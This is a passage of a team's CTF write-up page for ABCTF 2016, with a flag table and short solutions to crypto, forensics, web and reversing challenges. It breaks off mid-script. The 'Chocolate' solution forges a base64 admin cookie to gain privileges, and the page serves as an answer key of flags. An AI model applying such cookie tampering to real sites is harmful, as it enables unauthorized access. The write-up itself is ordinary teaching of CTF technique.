<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="ABCTF 2016" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/ABCTF-2016/" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/ABCTF-2016/" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2016-07-15T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ABCTF 2016" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2016-07-15T00:00:00+02:00","datePublished":"2016-07-15T00:00:00+02:00","description":"A set of CTF writeups by team Galaxians.","headline":"ABCTF 2016","mainEntityOfPage":{"@type":"WebPage","@id":"https://shiltemann.github.io/CTF-writeups-public/writeups/ABCTF-2016/"},"url":"https://shiltemann.github.io/CTF-writeups-public/writeups/ABCTF-2016/"}</script><title> Galaxians CTF | ABCTF 2016</title><link rel="apple-touch-icon" sizes="180x180" href="/CTF-writeups-public/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/CTF-writeups-public/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/CTF-writeups-public/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/CTF-writeups-public/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/CTF-writeups-public/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/CTF-writeups-public/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/CTF-writeups-public/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/CTF-writeups-public/" class="mx-auto"> <img src="/CTF-writeups-public/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/CTF-writeups-public/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/CTF-writeups-public/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/posts/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/CTF-writeups-public/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/CTF-writeups-public/"> Home </a> </span> <span>ABCTF 2016</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> ABCTF 2016</h1><p>Week-long CTF in July 2016</p><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Points<th>Category<th>Flag<tbody><tr><td><a href="#caesar-salad">Caesar Salad</a><td>10<td>crypto<td><code>abctf{w3_thought_w3_n33d3d_on3_of_th3s3}</code><tr><td><a href="#elemental">Elemental</a><td>10<td>web<td><code>ABCTF{insp3ct3d_dat_3l3m3nt}</code><tr><td><a href="#virtual-box-1">Virtual Box 1</a><td>10<td>virtual series<td><code>ABCTF{FREE_P0INTS}</code><tr><td><a href="#just-open-it">Just open it</a><td>15<td>forensics<td><code>ABCTF{forensics_1_tooo_easy?}</code><tr><td><a href="#virtual-box-2">Virtual Box 2</a><td>15<td>virtual series<td><code>ABCTF{H1DDEN_AWAY}</code><tr><td><a href="#tgif">TGIF</a><td>30<td>programming<td><code>ABCTF{194}</code><tr><td><a href="#gz">GZ</a><td>30<td>forensics<td><code>ABCTF{broken_zipper}</code><tr><td><a href="#virtual-box-3">Virtual Box 3</a><td>35<td>virtual series<td><code>ABCTF{FR0M_THE_FUTURE}</code><tr><td><a href="#the-flash">The Flash</a><td>35<td>web<td><code>ABCTF{no(d3)_js_is_s3cur3_dasjkhadbkjfbjfdjbfsdajfasdl}</code><tr><td><a href="#archive-me">Archive Me</a><td>50<td>recon<td><code>ABCTF{Archives_are_useful!}</code><tr><td><a href="#chocolate">Chocolate</a><td>50<td>web<td><code>ABCTF{don't_trust_th3_coooki3}</code><tr><td><a href="#best-ganondorf">Best Ganondorf</a><td>50<td>forensics<td><code>abctf{tfw_kage_r3kt_nyway}</code><tr><td><a href="#drive-home">Drive Home</a><td>50<td>recon<td><code>abctf{g00gle_driv3_1s_my_f4v0r1t3}</code><tr><td><a href="#java-madness">Java Madness</a><td>50<td>reversing<td><code>ABCTF{ftc tselooc eht si ftcba}</code><tr><td><a href="#hide-and-seek">Hide and Seek</a><td>50<td>binary<td> unsolved<tr><td><a href="#yummi">Yummi</a><td>60<td>crypto<td> unsolved<tr><td><a href="#virtual-box-4">Virtual Box 4</a><td>60<td>virtual series<td><code>ABCTF{Y0U_F0UND_ME}</code><tr><td><a href="#moonwalk">Moonwalk</a><td>60<td>forensics<td><code>ABCTF{PNG_S0_C00l}</code><tr><td><a href="#slime-season">Slime Season</a><td>60<td>programming<td> unsolved<tr><td><a href="#old-rsa">Old RSA</a><td>70<td>crypto<td><code>ABCTF{th1s_was_h4rd_in_1980}</code><tr><td><a href="#l33t-h4xx0r">L33t H4xx0r</a><td>70<td>web<td><code>abctf{always_know_whats_going_on}</code><tr><td><a href="#virtual-box-5">Virtual Box 5</a><td>75<td>virtual series<td> unsolved<tr><td><a href="#virtual-box-6">Virtual Box 6</a><td>75<td>virtual series<td><code>ABCTF{I_L0VE_PATTERNS}</code><tr><td><a href="#aes-mess">AES Mess</a><td>75<td>crypto<td><code>abctf{looks_like_you_can_break_aes}</code><tr><td><a href="#passwordpdf">PasswordPDF</a><td>80<td>forensics<td> unsolved<tr><td><a href="#get-em-all">Get ‘Em all</a><td>80<td>web<td><code>ABCTF{th4t_is_why_you_n33d_to_sanitiz3_inputs}</code><tr><td><a href="#js-pls">JS Pls</a><td>80<td>reversing<td><code>ABCTF{node_is_w4Ck}</code><tr><td><a href="#safety-first">Safety First</a><td>95<td>web<td> unsolved<tr><td><a href="#always-so-itchy">Always so Itchy</a><td>100<td>recon<td><code>ABCTF{DoYouThinkISpentTooMuchTimeOnThis}</code><tr><td><a href="#racecar">RacecaR</a><td>100<td>programming<td> unsolved<tr><td><a href="#virtual-box-7">Virtual Box 7</a><td>100<td>virtual series<td> unsolved<tr><td><a href="#meteor-smash">Meteor Smash</a><td>100<td>web<td> unsolved<tr><td><a href="#qset1">Qset1</a><td>100<td>programming<td> unsolved<tr><td><a href="#zippy">Zippy</a><td>120<td>forensics<td> unsolved<tr><td><a href="#the-big-kahuna">The Big Kahuna</a><td>120<td>programming<td><code>abctf{28}</code><tr><td><a href="#a-small-broadcast">A Small Broadcast</a><td>125<td>crypto<td> unsolved<tr><td><a href="#encryption-service">Encryption Service</a><td>140<td>crypto<td> unsolved<tr><td><a href="#reunion">Reunion</a><td>150<td>web<td><code>abctf{uni0n_1s_4_gr34t_c0mm4nd}</code><tr><td><a href="#qset2">Qset2</a><td>150<td>programming<td> unsolved<tr><td><a href="#sexy-rsa">Sexy RSA</a><td>160<td>crypto<td><code>ABCTF{i_h4ve_an_RSA_fetish_;)}</code><tr><td><a href="#custom-authentication">Custom Authentication</a><td>160<td>crypto<td> unsolved<tr><td><a href="#inj3ction">Inj3ction</a><td>170<td>web<td> unsolved<tr><td><a href="#qset3">Qset3</a><td>200<td>programming<td> unsolved<tr><td><a href="#audioedit">AudioEdit</a><td>200<td>web<td> unsolved<tr><td><a href="#frozen-recursion">Frozen Recursion</a><td>250<td>reversing<td> unsolved<tr><td><a href="#liorogamerdvd">Liorogamerdvd</a><td>300<td>recon<td> unsolved</table></div></div><h1 id="caesar-salad"> Caesar Salad <a href="/CTF-writeups-public/writeups/ABCTF-2016/00-cryptography-10-caesar-salad.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Most definitely the best salad around. Can you decrypt this for us?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>xyzqc{t3_qelrdeq_t3_k33a3a_lk3_lc_qe3p3}
</pre></table></code></div></div><p><strong>Solution</strong> The traditional caesar shift first challenge, turned out to be ROT-16:</p><h2> Flag</h2><code> abctf{w3_thought_w3_n33d3d_on3_of_th3s3} </code><hr><h1 id="elemental"> Elemental <a href="/CTF-writeups-public/writeups/ABCTF-2016/01-web-exploitation-10-elemental.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Just put in the password for the flag! <a href="http://yrmyzscnvh.abctf.xyz/web1/">Link</a></p><p><strong>Solution</strong> Web page with a password field, password was in source as a comment, entering it in field gave the flag</p><h2> Flag</h2><code> ABCTF{insp3ct3d_dat_3l3m3nt} </code><hr><h1 id="virtual-box-1"> Virtual Box 1 <a href="/CTF-writeups-public/writeups/ABCTF-2016/02-virtual-series-10-virtual-box-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> Do you know how to use a VM? Download the Virtual Machine here.</p><p><strong>Solution</strong> <br /> just run the VM, was windows 98, flag was in a file named <code class="language-plaintext highlighter-rouge">flag.txt</code> on the desktop</p><h2> Flag</h2><code> ABCTF{FREE_P0INTS} </code><hr><h1 id="just-open-it"> Just open it <a href="/CTF-writeups-public/writeups/ABCTF-2016/03-forensics-15-just-open-it.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> I’m almost positive we put a flag in <a href="writeupfiles/forensics15.jpg">this</a> file. Can you find it for me?</p><p><em>Hint: So many editors out there!</em></p><p><strong>Solution</strong> <br /> file was an image:</p><p><img src="writeupfiles/forensics15.jpg" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ strings forensics15.jpg
[..]
f~ZF.~
QEAaE
P ABCTF{forensics_1_tooo_easy?}
=0s^
)8,=
Wt;fR
[..]
</pre></table></code></div></div><h2> Flag</h2><code> ABCTF{forensics_1_tooo_easy?} </code><hr><h1 id="virtual-box-2"> Virtual Box 2 <a href="/CTF-writeups-public/writeups/ABCTF-2016/04-virtual-series-15-virtual-box-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> Darn, I found this flag so I put it in flag 1.doc but I can’t seem to be able to see it anymore.</p><p><strong>Solution</strong> <br /> there was some more invisible text in the file named <code class="language-plaintext highlighter-rouge">flag.txt</code> on the desktop, this was the second flag</p><h2> Flag</h2><code> ABCTF{H1DDEN_AWAY} </code><hr><h1 id="tgif"> TGIF <a href="/CTF-writeups-public/writeups/ABCTF-2016/05-programming-30-tgif.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Friday is the best day of the week, and so I really want to know how many Fridays there are in <a href="writeupfiles/date.txt">this</a> file. But, with a twist. I want to know how many Fridays there are one year later than each date.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">datetime</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">date.txt</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">l2</span><span class="o">=</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">split</span><span class="p">()</span>
        <span class="n">l2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">l2</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">line</span><span class="o">=</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">l2</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">day</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sh">'</span><span class="s">%B %d, %Y</span><span class="sh">'</span><span class="p">).</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%A</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">day</span> <span class="o">==</span> <span class="sh">"</span><span class="s">Friday</span><span class="sh">"</span><span class="p">:</span>
                <span class="n">count</span><span class="o">+=</span><span class="mi">1</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
<span class="k">print</span> <span class="n">count</span>
</pre></table></code></div></div><p>output: <code class="language-plaintext highlighter-rouge">194</code></p><h2> Flag</h2><code> ABCTF{194} </code><hr><h1 id="gz"> GZ <a href="/CTF-writeups-public/writeups/ABCTF-2016/06-forensics-30-gz.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> We shot a flag into <a href="writupfiles/forensics30">this</a> file but some things got messed up on the way…</p><p>Can you somehow get the flag from this website?</p><p><strong>Solution</strong> <br /> The file was gzipped.</p><h2> Flag</h2><code> ABCTF{broken_zipper} </code><hr><h1 id="virtual-box-3"> Virtual Box 3 <a href="/CTF-writeups-public/writeups/ABCTF-2016/07-virtual-series-35-virtual-box-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> This mysterious file was left here, but I have no idea how to open it. Do you? I left it in a folder named 2016 just for you.</p><p><strong>Solution</strong> <br /> file had no extension, but was a zip file, unpack, search all the files, find the flag in one of them.</p><h2> Flag</h2><code> ABCTF{FR0M_THE_FUTURE} </code><hr><h1 id="the-flash"> The Flash <a href="/CTF-writeups-public/writeups/ABCTF-2016/08-web-exploitation-35-the-flash.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you somehow get the flag from this website?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>website with password field, comment in html, base64 decode to get password, gives flag</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- c3RvcHRoYXRqcw== --&gt;</span>
</pre></table></code></div></div><p>which is <code class="language-plaintext highlighter-rouge">stopthatjs</code>, entering this in password field gives the flag in the source</p><h2> Flag</h2><code> ABCTF{no(d3)_js_is_s3cur3_dasjkhadbkjfbjfdjbfsdajfasdl} </code><hr><h1 id="archive-me"> Archive Me <a href="/CTF-writeups-public/writeups/ABCTF-2016/09-reconnaissance-50-archive-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> If you could look at our website from a while ago im sure the flag would be there…</p><p><strong>Solution</strong> Checked archive.org for old copies of the website. There were two, the second one had the flag in the source. https://web.archive.org/web/20160510192307/http://abctf.xyz</p><h2> Flag</h2><code> ABCTF{Archives_are_useful!} </code><hr><h1 id="chocolate"> Chocolate <a href="/CTF-writeups-public/writeups/ABCTF-2016/10-web-exploitation-50-chocolate.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If you could become admin you would get a flag. <website link=""></website></p><p><strong>Solution</strong> website said <code class="language-plaintext highlighter-rouge">You're not an admin. Please leave this site.</code></p><p>Found a cookie containing value <code class="language-plaintext highlighter-rouge">e2FkbWluOmZhbHNlfQ==</code>, base64 decodes to <code class="language-plaintext highlighter-rouge">{admin:false}</code>, change the cookie to <code class="language-plaintext highlighter-rouge">base64("{admin:true}")</code> and reload the page gave the flag</p><h2> Flag</h2><code> ABCTF{don't_trust_th3_coooki3} </code><hr><h1 id="best-ganondorf"> Best Ganondorf <a href="/CTF-writeups-public/writeups/ABCTF-2016/11-forensics-50---best-ganondorf.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> You know the deal. Find a flag in <a href="writeupfiles/ezmonay.jpg">this</a> file?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>File has <code class="language-plaintext highlighter-rouge">.jpg</code> extension but is not a valid jpeg. We open in a hex editor and it looks like it could be a jpeg file, but the header is invalid</p><p>we change the first two bytes of the header to <code class="language-plaintext highlighter-rouge">FFD8</code> and now we can view the image (which contains the flag)</p><p><img src="writeupfiles/ezmonay_fixed.jpg" alt="" /></p><h2> Flag</h2><code> abctf{tfw_kage_r3kt_nyway} </code><hr><h1 id="drive-home"> Drive Home <a href="/CTF-writeups-public/writeups/ABCTF-2016/12-reconnaissance-50-drive-home.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> We found this link scribbled on a piece of paper: document/1_TxYCrk5vIMlUjiB1OioXmR7b-Uq_a9aPIh9JyYlPNs/edit?usp=sharing. It is broken but we need you to fix it!</p><p><strong>Solution</strong> It is a google drive URL, needs to be expanded into the <a href="https://docs.google.com/document/d/1_TxYCrk5vIMlUjiB1OioXmR7b-Uq_a9aPIh9JyYlPNs/edit">full version</a> which contains the flag</p><h2> Flag</h2><code> abctf{g00gle_driv3_1s_my_f4v0r1t3} </code><hr><h1 id="java-madness"> Java Madness <a href="/CTF-writeups-public/writeups/ABCTF-2016/13-reverse-engineering-50-java-madness.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Hey if you can get this to pass some tests you could probably have the flag.</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">what_the_hack</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">check</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
        <span class="k">if</span><span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">5</span><span class="o">){</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Almost! (;"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">else</span> <span class="o">{</span>
            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">--){</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">j</span><span class="o">--){</span>
                    <span class="n">check</span> <span class="o">+=</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">charAt</span><span class="o">(</span><span class="n">j</span><span class="o">);</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">charAt</span><span class="o">(</span><span class="n">j</span><span class="o">));</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="k">if</span><span class="o">(</span><span class="n">check</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"abctf is the coolest ctf"</span><span class="o">)){</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Flag: "</span> <span class="o">+</span> <span class="s">"ABCTF{"</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">+</span><span class="n">args</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span> <span class="o">+</span> <span class="s">"}"</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">else</span><span class="o">{</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">check</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p><strong>Solution</strong> The associated java file used a couple loops to reverse the five arguments. The key was encoded in the file as “abctfs is the coolest ctf”. After understanding what the loop did I <code class="language-plaintext highlighter-rouge">echo 'abctf is the coolest ctf' | rev</code> to get the key</p><h2> Flag</h2><code> ABCTF{ftc tselooc eht si ftcba} </code><hr><h1 id="hide-and-seek"> Hide and Seek <a href="/CTF-writeups-public/writeups/ABCTF-2016/14-binary-exploitation-50-hide-and-seek.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> There is a flag hidden somewhere in <a href="writeupfiles/haha-1">this</a> binary. Good luck!</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="yummi"> Yummi <a href="/CTF-writeups-public/writeups/ABCTF-2016/15-cryptography-60-yummi.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>Well <a href="writeupfiles/baconian.bmp">this</a> image means something and we need you to figure it out!</p><p><img src="writeupfiles/baconian.bmp" alt="" /></p><p><em>Hint: Water -&gt; Fish, Mud -&gt; ???</em></p><p><strong>Solution</strong> All pixels were either black or white, convert to bitstring</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>

<span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">baconian.bmp</span><span class="sh">'</span><span class="p">).</span><span class="nf">convert</span><span class="p">(</span><span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pixels_orig</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">)</span><span class="o">=</span><span class="n">img</span><span class="p">.</span><span class="n">size</span>

<span class="n">s</span><span class="o">=</span><span class="p">[]</span>
<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">w</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">h</span><span class="p">):</span>
